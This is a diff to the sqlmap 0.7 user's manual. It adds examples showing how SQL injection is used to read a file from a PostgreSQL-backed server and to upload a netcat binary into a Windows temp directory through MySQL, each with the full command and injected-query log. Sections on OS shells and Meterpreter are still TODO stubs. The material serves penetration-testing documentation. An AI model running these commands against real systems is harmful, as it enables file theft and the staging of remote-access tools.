@@ -4,7 +4,7 @@
 
 <title>sqlmap user's manual
 <author>by <htmlurl url="mailto:bernardo.damele@gmail.com" name="Bernardo Damele A. G.">
-<date>version 0.7 release candidate 1, April 22, 2009
+<date>version 0.7, July 25, 2009
 <abstract>
 This document is the user's manual to use <htmlurl url="http://sqlmap.sourceforge.net" name="sqlmap">.
 Check the project <htmlurl url="http://sqlmap.sourceforge.net" name="homepage">
@@ -3846,7 +3846,76 @@ support when the back-end DBMS is PostgreSQL.
 Option: <tt>--read-file</tt>
 
 <p>
-This paragraph will be written for sqlmap 0.7 stable version, refer to the white paper <htmlurl url="http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf" name="Advanced SQL injection to operating system full control"> for the moment.
+It is possible to retrieve the content of files from the underlying file
+system when the back-end database management is system is either MySQL,
+PostgreSQL or Microsoft SQL Server.
+The file specified can be either a text or a binary file, sqlmap will
+handle either cases automatically.
+
+<p>
+The techniques implemented are detailed on the white paper
+<htmlurl url="http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf" name="Advanced SQL injection to operating system full control">.
+
+<p>
+Example on a <bf>PostgreSQL 8.3.5</bf> target:
+
+<tscreen><verb>
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --read-file \
+  "C:\example.txt" -v2
+
+[...]
+[hh:mm:53] [INFO] the back-end DBMS is PostgreSQL
+web server operating system: Windows 2003 or 2008
+web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727
+back-end DBMS: PostgreSQL
+
+[hh:mm:53] [INFO] testing stacked queries support on parameter 'id'
+[hh:mm:53] [INFO] detecting back-end DBMS version from its banner
+[hh:mm:53] [DEBUG] query: COALESCE(CAST(SUBSTR((VERSION())::text, 12, 6) AS CHARACTER(10000)), 
+CHR(32))
+[hh:mm:53] [INFO] retrieved: 8.3.5,
+[hh:mm:58] [DEBUG] performed 49 queries in 4 seconds
+[hh:mm:58] [DEBUG] query: SELECT PG_SLEEP(5)
+[hh:mm:03] [INFO] the web application supports stacked queries on parameter 'id'
+[hh:mm:03] [INFO] fingerprinting the back-end DBMS operating system
+[hh:mm:03] [DEBUG] query: DROP TABLE sqlmapfile
+[hh:mm:03] [DEBUG] query: CREATE TABLE sqlmapfile(data character(500))
+[hh:mm:03] [DEBUG] query: INSERT INTO sqlmapfile(data) VALUES (VERSION())
+[hh:mm:03] [DEBUG] query: SELECT (CASE WHEN ((SELECT LENGTH(data) FROM sqlmapfile WHERE data 
+LIKE CHR(37)||CHR(32)||CHR(86)||CHR(105)||CHR(115)||CHR(117)||CHR(97)||CHR(108)||CHR(32)||
+CHR(67)||CHR(43)||CHR(43)||CHR(37))>0) THEN 1 ELSE 0 END)
+[hh:mm:03] [INFO] retrieved: 1
+[hh:mm:03] [DEBUG] performed 5 queries in 0 seconds
+[hh:mm:03] [INFO] the back-end DBMS operating system is Windows
+[hh:mm:03] [DEBUG] cleaning up the database management system
+[hh:mm:03] [DEBUG] removing support tables
+[hh:mm:04] [DEBUG] query: DROP TABLE sqlmapfile
+[hh:mm:04] [DEBUG] going to read the file with stacked query SQL injection technique
+[hh:mm:04] [WARNING] binary file read on PostgreSQL is not yet supported, if the requested file 
+is binary, its content will not be retrieved
+[hh:mm:04] [INFO] fetching file: 'C:/example.txt'
+[hh:mm:04] [DEBUG] query: DROP TABLE sqlmapfile
+[hh:mm:04] [DEBUG] query: CREATE TABLE sqlmapfile(data bytea)
+[hh:mm:04] [DEBUG] loading the content of file 'C:/example.txt' into support table
+[hh:mm:04] [DEBUG] query: COPY sqlmapfile(data) FROM 'C:/example.txt'
+[hh:mm:04] [DEBUG] query: SELECT COALESCE(CAST(COUNT(data) AS CHARACTER(10000)), CHR(32)) FROM 
+sqlmapfile
+[hh:mm:04] [INFO] retrieved: 1
+[hh:mm:04] [DEBUG] performed 6 queries in 0 seconds
+[hh:mm:04] [DEBUG] query: SELECT COALESCE(CAST(ENCODE(data, CHR(98)||CHR(97)||CHR(115)||CHR(101)
+||CHR(54)||CHR(52)) AS CHARACTER(10000)), CHR(32)) FROM sqlmapfile OFFSET 0 LIMIT 1
+[hh:mm:04] [INFO] retrieved: VGhpcyBpcyBhIHRleHQgZmlsZQ==
+[hh:mm:22] [DEBUG] performed 203 queries in 18 seconds
+[hh:mm:22] [DEBUG] cleaning up the database management system
+[hh:mm:22] [DEBUG] removing support tables
+[hh:mm:22] [DEBUG] query: DROP TABLE sqlmapfile
+C:/example.txt file saved to:    '/home/inquis/sqlmap/output/192.168.1.121/files/C__example.txt'
+
+[hh:mm:22] [INFO] Fetched data logged to text files under '/home/inquis/sqlmap/output/192.168.1.121'
+
+$ cat output/192.168.1.121/files/C__example.txt 
+This is a text file
+</verb></tscreen>
 
 
 <sect2>Write a local file on the back-end DBMS file system
@@ -3855,7 +3924,42 @@ This paragraph will be written for sqlmap 0.7 stable version, refer to the white
 Options: <tt>--write-file</tt> and <tt>--dest-file</tt>
 
 <p>
-This paragraph will be written for sqlmap 0.7 stable version, refer to the white paper <htmlurl url="http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf" name="Advanced SQL injection to operating system full control"> for the moment.
+It is possible to upload a local file to the underlying file system when
+the back-end database management is system is either MySQL, PostgreSQL or
+Microsoft SQL Server.
+The file specified can be either a text or a binary file, sqlmap will
+handle either cases automatically.
+
+<p>
+The techniques implemented are detailed on the white paper
+<htmlurl url="http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf" name="Advanced SQL injection to operating system full control">.
+
+<p>
+Example on a <bf>MySQL 5.0.67</bf> target:
+
+<tscreen><verb>
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --write-file \
+  "/home/inquis/software/netcat/nc.exe.packed" --dest-file "C:\WINDOWS\Temp\nc.exe" -v 1
+
+[...]
+[01:12:29] [INFO] the back-end DBMS is MySQL
+web server operating system: Windows 2003 or 2008
+web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727
+back-end DBMS: MySQL >= 5.0.0
+
+[01:12:29] [INFO] testing stacked queries support on parameter 'id'
+[01:12:29] [INFO] detecting back-end DBMS version from its banner
+[01:12:29] [INFO] retrieved: 5.0.67
+[01:12:36] [INFO] the web application supports stacked queries on parameter 'id'
+[01:12:36] [INFO] fingerprinting the back-end DBMS operating system
+[01:12:36] [INFO] retrieved: C
+[01:12:36] [INFO] the back-end DBMS operating system is Windows
+do you want confirmation that the file 'C:/WINDOWS/Temp/nc.exe' has been successfully 
+written on the back-end DBMS file system? [Y/n] y
+[01:12:52] [INFO] retrieved: 31744
+[01:12:52] [INFO] the file has been successfully written and its size is 31744 bytes, same 
+size as the local file '/home/inquis/software/netcat/nc.exe.packed'
+</verb></tscreen>
 
 
 <sect1>Operating system access
@@ -3866,7 +3970,11 @@ This paragraph will be written for sqlmap 0.7 stable version, refer to the white
 Option: <tt>--os-cmd</tt>
 
 <p>
-This paragraph will be written for sqlmap 0.7 stable version, refer to the white paper <htmlurl url="http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf" name="Advanced SQL injection to operating system full control"> for the moment.
+TODO
+
+<p>
+The techniques implemented are detailed on the white paper
+<htmlurl url="http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf" name="Advanced SQL injection to operating system full control">.
 
 
 <sect2>Prompt for an interactive operating system shell
@@ -3875,7 +3983,11 @@ This paragraph will be written for sqlmap 0.7 stable version, refer to the white
 Option: <tt>--os-shell</tt>
 
 <p>
-This paragraph will be written for sqlmap 0.7 stable version, refer to the white paper <htmlurl url="http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf" name="Advanced SQL injection to operating system full control"> for the moment.
+TODO
+
+<p>
+The techniques implemented are detailed on the white paper
+<htmlurl url="http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf" name="Advanced SQL injection to operating system full control">.
 
 
 <sect2>Prompt for an out-of-band shell, meterpreter or VNC
@@ -3884,7 +3996,11 @@ This paragraph will be written for sqlmap 0.7 stable version, refer to the white
 Options: <tt>--os-pwn</tt>, <tt>--priv-esc</tt>, <tt>--msf-path</tt> and <tt>--tmp-path</tt>
 
 <p>
-This paragraph will be written for sqlmap 0.7 stable version, refer to the white paper <htmlurl url="http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf" name="Advanced SQL injection to operating system full control"> for the moment.
+TODO
+
+<p>
+The techniques implemented are detailed on the white paper
+<htmlurl url="http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf" name="Advanced SQL injection to operating system full control">.
 
 
 <sect2>One click prompt for an out-of-band shell, meterpreter or VNC
@@ -3893,7 +4009,11 @@ This paragraph will be written for sqlmap 0.7 stable version, refer to the white
 Options: <tt>--os-smbrelay</tt>, <tt>--priv-esc</tt> and <tt>--msf-path</tt>
 
 <p>
-This paragraph will be written for sqlmap 0.7 stable version, refer to the white paper <htmlurl url="http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf" name="Advanced SQL injection to operating system full control"> for the moment.
+TODO
+
+<p>
+The techniques implemented are detailed on the white paper
+<htmlurl url="http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf" name="Advanced SQL injection to operating system full control">.
 
 
 <sect2>Stored procedure buffer overflow exploitation
@@ -3902,7 +4022,11 @@ This paragraph will be written for sqlmap 0.7 stable version, refer to the white
 Options: <tt>--os-bof</tt>, <tt>--priv-esc</tt> and <tt>--msf-path</tt>
 
 <p>
-This paragraph will be written for sqlmap 0.7 stable version, refer to the white paper <htmlurl url="http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf" name="Advanced SQL injection to operating system full control"> for the moment.
+TODO
+
+<p>
+The techniques implemented are detailed on the white paper
+<htmlurl url="http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf" name="Advanced SQL injection to operating system full control">.
 
 
 <sect1>Miscellaneous
